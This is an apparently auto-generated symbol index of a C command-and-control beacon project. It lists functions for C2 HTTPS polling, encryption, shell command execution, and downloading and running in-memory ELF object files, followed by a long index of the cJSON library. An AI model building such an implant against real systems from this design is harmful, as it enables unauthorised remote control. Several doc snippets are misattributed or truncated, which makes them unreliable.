- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### get_or_create_trampoline (function) `void *get_or_create_trampoline(void *target);`
- Defined: `include/beacon_common.h:110`
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### https_request (function) `http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method, const char *post_data);`
- Defined: `include/beacon_common.h:116`
- Doc: HTTP client: performs GET or POST request. Returns a struct with the response body, length, and status code. On error, d
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### base64_encode (function) `char *base64_encode(const unsigned char *input, int len);`
- Defined: `include/beacon_common.h:122`
- Doc: HTTP client: performs GET or POST request. Returns a struct with the response body, length, and status code. On error, d
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### base64_decode (function) `unsigned char *base64_decode(const char *input, int *len);`
- Defined: `include/beacon_common.h:123`
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### url_encode (function) `char *url_encode(const char *in, size_t in_len, size_t *out_len);`
- Defined: `include/beacon_common.h:126`
- Doc: HTTP client: performs GET or POST request. Returns a struct with the response body, length, and status code. On error, d
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### aes256_cfb_encrypt (function) `unsigned char *aes256_cfb_encrypt(const unsigned char *key, const unsigned char *iv, const unsigned char *plaintext, size_t len, int *out_len);`
- Defined: `include/beacon_common.h:129`
- Doc: Uses config for timeouts, TLS verification, and user-agent. http_response_t https_request(const bsb_config_t *cfg, const
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### aes256_cfb_decrypt (function) `unsigned char *aes256_cfb_decrypt(const unsigned char *key, const unsigned char *iv, const unsigned char *ciphertext, size_t len, int *out_len);`
- Defined: `include/beacon_common.h:133`
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### buffer (function) `* buffer (caller frees). On error, returns NULL. */ char *exec_cmd(const char *cmd, int *out_len);`
- Defined: `include/beacon_common.h:139`
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### RunELF (function) `int RunELF(const char *functionname, unsigned char *elf_data, uint32_t filesize, unsigned char *argumentdata, int argumentSize);`
- Defined: `include/beacon_common.h:147`
- Doc: ELF BOF loader. Loads a position-independent ELF object into memory, resolves symbols, applies relocations, and calls th
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### download_bof (function) `unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size);`
- Defined: `include/beacon_common.h:155`
- Doc: Download a BOF from the C2 server. Returns malloc'd buffer * (caller frees). On error, sets *out_size to 0 and returns N
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### run_bof_and_capture (function) `char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize, char *args, int arglen, int *out_len);`
- Defined: `include/beacon_common.h:161`
- Doc: Execute a BOF and capture its output. Returns malloc'd string * (caller frees). On error or empty output, returns strdup
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### get_local_ips (function) `char *get_local_ips(void);`
- Defined: `include/beacon_common.h:169`
- Doc: Get local IP addresses as a comma-separated string. Returns * malloc'd buffer (caller frees). Falls back to "127.0.0.1".
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### bsb_backoff_init (function) `void bsb_backoff_init(bsb_backoff_t *bo, int base, int max);`
- Defined: `include/beacon_common.h:178`
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### bsb_backoff_next (function) `int bsb_backoff_next(bsb_backoff_t *bo);`
- Defined: `include/beacon_common.h:180`
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

### bsb_backoff_reset (function) `void bsb_backoff_reset(bsb_backoff_t *bo);`
- Defined: `include/beacon_common.h:181`
- Depends on: `include/config.h`
- Imported by: `beacons/v1/beacon.c`, `beacons/v2/beacon.c`, `beacons/v3/beacon.c`, `include/beacon_common.c`

## include/cJSON.c

### CJSON_PUBLIC (function) `CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)`
- Defined: `include/cJSON.c:94`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)`
- Defined: `include/cJSON.c:99`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)`
- Defined: `include/cJSON.c:109`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(const char*) cJSON_Version(void)`
- Defined: `include/cJSON.c:124`
- Doc: CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item) { if (!cJSON_IsNumber(item)) { return (double) NAN; 
- Depends on: `include/cJSON.h`

### case_insensitive_strcmp (function) `static int case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)`
- Defined: `include/cJSON.c:134`
- Doc: /* This is a safeguard to prevent copy-pasters from using incompatible C and header files #if (CJSON_VERSION_MAJOR != 1)
- Depends on: `include/cJSON.h`

### internal_malloc (function) `static void * CJSON_CDECL internal_malloc(size_t size)`
- Defined: `include/cJSON.c:166`
- Doc: } return tolower(*string1) - tolower(*string2); } typedef struct internal_hooks { void *(CJSON_CDECL *allocate)(size_t s
- Depends on: `include/cJSON.h`

### internal_free (function) `static void CJSON_CDECL internal_free(void *pointer)`
- Defined: `include/cJSON.c:170`
- Depends on: `include/cJSON.h`

### internal_realloc (function) `static void * CJSON_CDECL internal_realloc(void *pointer, size_t size)`
- Defined: `include/cJSON.c:174`
- Depends on: `include/cJSON.h`

### cJSON_strdup (function) `static unsigned char* cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)`
- Defined: `include/cJSON.c:188`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)`
- Defined: `include/cJSON.c:209`
- Depends on: `include/cJSON.h`

### cJSON_New_Item (function) `static cJSON *cJSON_New_Item(const internal_hooks * const hooks)`
- Defined: `include/cJSON.c:242`
- Doc: if (hooks->free_fn != NULL) { global_hooks.deallocate = hooks->free_fn; } /* use realloc only if both free and malloc ar
- Depends on: `include/cJSON.h`

### get_decimal_point (function) `static unsigned char get_decimal_point(void)`
- Defined: `include/cJSON.c:281`
- Doc: item->valuestring = NULL; } if (!(item->type & cJSON_StringIsConst) && (item->string != NULL)) { global_hooks.deallocate
- Depends on: `include/cJSON.h`

### parse_number (function) `static cJSON_bool parse_number(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `include/cJSON.c:309`
- Doc: size_t offset; size_t depth; /* How deeply nested (in arrays/objects) is the input at the current offset. internal_hooks
- Depends on: `include/cJSON.h`

### ensure (function) `static unsigned char* ensure(printbuffer * const p, size_t needed)`
- Defined: `include/cJSON.c:494`
- Doc: } typedef struct { unsigned char *buffer; size_t length; size_t offset; size_t depth; /* current nesting depth (for form
- Depends on: `include/cJSON.h`

### update_offset (function) `static void update_offset(printbuffer * const buffer)`
- Defined: `include/cJSON.c:579`
- Doc: p->buffer = NULL; return NULL; } memcpy(newbuffer, p->buffer, p->offset + 1); p->hooks.deallocate(p->buffer); } p->lengt
- Depends on: `include/cJSON.h`

### compare_double (function) `static cJSON_bool compare_double(double a, double b)`
- Defined: `include/cJSON.c:592`
- Doc: /* calculate the new length of the string in a printbuffer and update the offset static void update_offset(printbuffer *
- Depends on: `include/cJSON.h`

### print_number (function) `static cJSON_bool print_number(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `include/cJSON.c:599`
- Doc: } buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely
- Depends on: `include/cJSON.h`

### parse_hex4 (function) `static unsigned parse_hex4(const unsigned char * const input)`
- Defined: `include/cJSON.c:669`
- Doc: output_pointer[i] = '.'; continue; } output_pointer[i] = number_buffer[i]; } output_pointer[i] = '\0'; output_buffer->of
- Depends on: `include/cJSON.h`

### utf16_literal_to_utf8 (function) `static unsigned char utf16_literal_to_utf8(const unsigned char * const input_pointer, const unsig...`
- Defined: `include/cJSON.c:706`
- Doc: converts a UTF-16 literal to UTF-8 * A literal can be one or two sequences of the form \uXXXX
- Depends on: `include/cJSON.h`

### parse_string (function) `static cJSON_bool parse_string(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `include/cJSON.c:827`
- Doc: else { (*output_pointer)[0] = (unsigned char)(codepoint & 0x7F); } output_pointer += utf8_length; return sequence_length
- Depends on: `include/cJSON.h`

### print_string_ptr (function) `static cJSON_bool print_string_ptr(const unsigned char * const input, printbuffer * const output_...`
- Defined: `include/cJSON.c:957`
- Doc: { input_buffer->hooks.deallocate(output); output = NULL; } if (input_pointer != NULL) { input_buffer->offset = (size_t)(
- Depends on: `include/cJSON.h`

### print_string (function) `static cJSON_bool print_string(const cJSON * const item, printbuffer * const p)`
- Defined: `include/cJSON.c:1079`
- Doc: /* escape and print as unicode codepoint sprintf((char*)output_pointer, "u%04x", *input_pointer); output_pointer += 4; b
- Depends on: `include/cJSON.h`

### buffer_skip_whitespace (function) `static parse_buffer *buffer_skip_whitespace(parse_buffer * const buffer)`
- Defined: `include/cJSON.c:1093`
- Doc: static cJSON_bool print_string(const cJSON * const item, printbuffer * const p) { return print_string_ptr((unsigned char
- Depends on: `include/cJSON.h`

### skip_utf8_bom (function) `static parse_buffer *skip_utf8_bom(parse_buffer * const buffer)`
- Defined: `include/cJSON.c:1119`
- Doc: while (can_access_at_index(buffer, 0) && (buffer_at_offset(buffer)[0] <= 32)) { buffer->offset++; } if (buffer->offset =
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithOpts(const char *value, const char **return_parse_end, cJSON...`
- Defined: `include/cJSON.c:1133`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithLength(const char *value, size_t buffer_length)`
- Defined: `include/cJSON.c:1235`
- Depends on: `include/cJSON.h`

### print (function) `static unsigned char *print(const cJSON * const item, cJSON_bool format, const internal_hooks * c...`
- Defined: `include/cJSON.c:1242`
- Doc: define cjson_min(a, b) (((a) < (b)) ? (a) : (b))
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_PrintUnformatted(const cJSON *item)`
- Defined: `include/cJSON.c:1315`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_PrintBuffered(const cJSON *item, int prebuffer, cJSON_bool fmt)`
- Defined: `include/cJSON.c:1320`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_PrintPreallocated(cJSON *item, char *buffer, const int length, con...`
- Defined: `include/cJSON.c:1351`
- Depends on: `include/cJSON.h`

### parse_value (function) `static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `include/cJSON.c:1372`
- Doc: return false; } p.buffer = (unsigned char*)buffer; p.length = (size_t)length; p.offset = 0; p.noalloc = true; p.format =
- Depends on: `include/cJSON.h`

### print_value (function) `static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `include/cJSON.c:1427`
- Doc: if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '[')) { return parse_array(item, input
- Depends on: `include/cJSON.h`

### parse_array (function) `static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `include/cJSON.c:1501`
- Doc: return print_string(item, output_buffer); case cJSON_Array: return print_array(item, output_buffer); case cJSON_Object: 
- Depends on: `include/cJSON.h`

### print_array (function) `static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `include/cJSON.c:1599`
- Doc: input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an array 
- Depends on: `include/cJSON.h`

### parse_object (function) `static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `include/cJSON.c:1661`
- Doc: output_pointer = ensure(output_buffer, 2); if (output_pointer == NULL) { return false; } output_pointer++ = ']'; output_
- Depends on: `include/cJSON.h`

### print_object (function) `static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `include/cJSON.c:1780`
- Doc: input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an object
- Depends on: `include/cJSON.h`

### get_array_item (function) `static cJSON* get_array_item(const cJSON *array, size_t index)`
- Defined: `include/cJSON.c:1915`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetArrayItem(const cJSON *array, int index)`
- Defined: `include/cJSON.c:1934`
- Depends on: `include/cJSON.h`

### get_object_item (function) `static cJSON *get_object_item(const cJSON * const object, const char * const name, const cJSON_bo...`
- Defined: `include/cJSON.c:1944`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItem(const cJSON * const object, const char * const string)`
- Defined: `include/cJSON.c:1976`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * c...`
- Defined: `include/cJSON.c:1981`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string)`
- Defined: `include/cJSON.c:1986`
- Depends on: `include/cJSON.h`

### suffix_object (function) `static void suffix_object(cJSON *prev, cJSON *item)`
- Defined: `include/cJSON.c:1993`
- Doc: return get_object_item(object, string, false); } CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * co
- Depends on: `include/cJSON.h`

### create_reference (function) `static cJSON *create_reference(const cJSON *item, const internal_hooks * const hooks)`
- Defined: `include/cJSON.c:2000`
- Doc: CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(objec
- Depends on: `include/cJSON.h`

### add_item_to_array (function) `static cJSON_bool add_item_to_array(cJSON *array, cJSON *item)`
- Defined: `include/cJSON.c:2020`
- Depends on: `include/cJSON.h`

### cast_away_const (function) `static void* cast_away_const(const void* string)`
- Defined: `include/cJSON.c:2066`
- Doc: /* Add item to array/object. CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToArray(cJSON *array, cJSON *item) { return add_item_
- Depends on: `include/cJSON.h`

### add_item_to_object (function) `static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * con...`
- Defined: `include/cJSON.c:2073`
- Doc: if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) pragma G
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToObject(cJSON *object, const char *string, cJSON *item)`
- Defined: `include/cJSON.c:2111`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item)`
- Defined: `include/cJSON.c:2122`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToObject(cJSON *object, const char *string, cJSON ...`
- Defined: `include/cJSON.c:2132`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddNullToObject(cJSON * const object, const char * const name)`
- Defined: `include/cJSON.c:2142`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddTrueToObject(cJSON * const object, const char * const name)`
- Defined: `include/cJSON.c:2154`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddFalseToObject(cJSON * const object, const char * const name)`
- Defined: `include/cJSON.c:2166`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddBoolToObject(cJSON * const object, const char * const name, const c...`
- Defined: `include/cJSON.c:2178`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddNumberToObject(cJSON * const object, const char * const name, const...`
- Defined: `include/cJSON.c:2190`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddStringToObject(cJSON * const object, const char * const name, const...`
- Defined: `include/cJSON.c:2202`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddRawToObject(cJSON * const object, const char * const name, const ch...`
- Defined: `include/cJSON.c:2214`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddObjectToObject(cJSON * const object, const char * const name)`
- Defined: `include/cJSON.c:2226`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddArrayToObject(cJSON * const object, const char * const name)`
- Defined: `include/cJSON.c:2238`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemViaPointer(cJSON *parent, cJSON * const item)`
- Defined: `include/cJSON.c:2250`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromArray(cJSON *array, int which)`
- Defined: `include/cJSON.c:2286`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromArray(cJSON *array, int which)`
- Defined: `include/cJSON.c:2296`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObject(cJSON *object, const char *string)`
- Defined: `include/cJSON.c:2301`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- Defined: `include/cJSON.c:2308`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObject(cJSON *object, const char *string)`
- Defined: `include/cJSON.c:2315`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- Defined: `include/cJSON.c:2320`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemViaPointer(cJSON * const parent, cJSON * const item, cJ...`
- Defined: `include/cJSON.c:2362`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInArray(cJSON *array, int which, cJSON *newitem)`
- Defined: `include/cJSON.c:2412`
- Depends on: `include/cJSON.h`

### replace_item_in_object (function) `static cJSON_bool replace_item_in_object(cJSON *object, const char *string, cJSON *replacement, c...`
- Defined: `include/cJSON.c:2422`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObject(cJSON *object, const char *string, cJSON *newi...`
- Defined: `include/cJSON.c:2445`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObjectCaseSensitive(cJSON *object, const char *string...`
- Defined: `include/cJSON.c:2450`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateTrue(void)`
- Defined: `include/cJSON.c:2467`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateFalse(void)`
- Defined: `include/cJSON.c:2478`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateBool(cJSON_bool boolean)`
- Defined: `include/cJSON.c:2489`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateNumber(double num)`
- Defined: `include/cJSON.c:2500`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateString(const char *string)`
- Defined: `include/cJSON.c:2525`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringReference(const char *string)`
- Defined: `include/cJSON.c:2542`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateObjectReference(const cJSON *child)`
- Defined: `include/cJSON.c:2554`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateArrayReference(const cJSON *child)`
- Defined: `include/cJSON.c:2566`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateRaw(const char *raw)`
- Defined: `include/cJSON.c:2578`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateArray(void)`
- Defined: `include/cJSON.c:2595`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateObject(void)`
- Defined: `include/cJSON.c:2606`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateFloatArray(const float *numbers, int count)`
- Defined: `include/cJSON.c:2658`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateDoubleArray(const double *numbers, int count)`
- Defined: `include/cJSON.c:2698`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringArray(const char *const *strings, int count)`
- Defined: `include/cJSON.c:2738`
- Depends on: `include/cJSON.h`

### cJSON_Duplicate_rec (function) `cJSON * cJSON_Duplicate_rec(const cJSON *item, size_t depth, cJSON_bool recurse)`
- Defined: `include/cJSON.c:2785`
- Depends on: `include/cJSON.h`

### skip_oneline_comment (function) `static void skip_oneline_comment(char **input)`
- Defined: `include/cJSON.c:2872`
- Depends on: `include/cJSON.h`

### skip_multiline_comment (function) `static void skip_multiline_comment(char **input)`
- Defined: `include/cJSON.c:2885`
- Depends on: `include/cJSON.h`

### minify_string (function) `static void minify_string(char **input, char **output)`
- Defined: `include/cJSON.c:2899`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_Minify(char *json)`
- Defined: `include/cJSON.c:2921`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsInvalid(const cJSON * const item)`
- Defined: `include/cJSON.c:2971`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsFalse(const cJSON * const item)`
- Defined: `include/cJSON.c:2981`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsTrue(const cJSON * const item)`
- Defined: `include/cJSON.c:2991`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsBool(const cJSON * const item)`
- Defined: `include/cJSON.c:3001`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNull(const cJSON * const item)`
- Defined: `include/cJSON.c:3011`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNumber(const cJSON * const item)`
- Defined: `include/cJSON.c:3021`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsString(const cJSON * const item)`
- Defined: `include/cJSON.c:3031`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsArray(const cJSON * const item)`
- Defined: `include/cJSON.c:3041`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsObject(const cJSON * const item)`
- Defined: `include/cJSON.c:3051`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsRaw(const cJSON * const item)`
- Defined: `include/cJSON.c:3061`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_...`
- Defined: `include/cJSON.c:3071`
- Depends on: `include/cJSON.h`

### cJSON_ArrayForEach (function) `cJSON_ArrayForEach(a_element, a)`
- Defined: `include/cJSON.c:3157`
- Depends on: `include/cJSON.h`

### cJSON_ArrayForEach (function) `cJSON_ArrayForEach(b_element, b)`
- Defined: `include/cJSON.c:3173`
- Doc: doing this twice, once on a and b to prevent true comparison if a subset of b * TODO: Do this the proper way, this is ju
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void *) cJSON_malloc(size_t size)`
- Defined: `include/cJSON.c:3193`
- Depends on: `include/cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_free(void *object)`
- Defined: `include/cJSON.c:3198`
- Depends on: `include/cJSON.h`

### sprintf (function) `sprintf(version, "%i.%i.%i", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);`
- Defined: `include/cJSON.c:128`
- Depends on: `include/cJSON.h`

### tolower (function) `return tolower(*string1) - tolower(*string2);`
- Defined: `include/cJSON.c:153`
- Depends on: `include/cJSON.h`

### void (function) `void (CJSON_CDECL *deallocate)(void *pointer);`
- Defined: `include/cJSON.c:160`
- Depends on: `include/cJSON.h`

### malloc (function) `return malloc(size);`
- Defined: `include/cJSON.c:168`
- Depends on: `include/cJSON.h`

### free (function) `free(pointer);`
- Defined: `include/cJSON.c:172`
- Depends on: `include/cJSON.h`

### realloc (function) `return realloc(pointer, size);`
- Defined: `include/cJSON.c:176`
- Depends on: `include/cJSON.h`

### memcpy (function) `memcpy(copy, string, length);`
- Defined: `include/cJSON.c:205`
- Depends on: `include/cJSON.h`

### memset (function) `memset(node, '\0', sizeof(cJSON));`
- Defined: `include/cJSON.c:247`
- Depends on: `include/cJSON.h`

### cJSON_Delete (function) `cJSON_Delete(item->child);`
- Defined: `include/cJSON.c:262`
- Depends on: `include/cJSON.h`

### strcpy (function) `strcpy(object->valuestring, valuestring);`
- Defined: `include/cJSON.c:464`
- Depends on: `include/cJSON.h`

### cJSON_free (function) `cJSON_free(object->valuestring);`
- Defined: `include/cJSON.c:475`
- Depends on: `include/cJSON.h`

### cJSON_ParseWithLengthOpts (function) `return cJSON_ParseWithLengthOpts(value, buffer_length, return_parse_end, require_null_terminated);`
- Defined: `include/cJSON.c:1145`
- Depends on: `include/cJSON.h`

### cJSON_ParseWithOpts (function) `return cJSON_ParseWithOpts(value, 0, 0);`
- Defined: `include/cJSON.c:1233`
- Depends on: `include/cJSON.h`

### cJSON_DetachItemViaPointer (function) `return cJSON_DetachItemViaPointer(array, get_array_item(array, (size_t)which));`
- Defined: `include/cJSON.c:2293`
- Depends on: `include/cJSON.h`

### cJSON_ReplaceItemViaPointer (function) `return cJSON_ReplaceItemViaPointer(array, get_array_item(array, (size_t)which), newitem);`
- Defined: `include/cJSON.c:2419`
- Depends on: `include/cJSON.h`

## include/cJSON.h

### void (function) `void (CJSON_CDECL *free_fn)(void *ptr);`
- Defined: `include/cJSON.h:118`
- Imported by: `include/beacon_common.c`, `include/cJSON.c`

### sensitive (function) `* case_sensitive determines if object keys are treated case sensitive (1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo`
- Defined: `include/cJSON.h:249`
- Imported by: `include/beacon_common.c`, `include/cJSON.c`

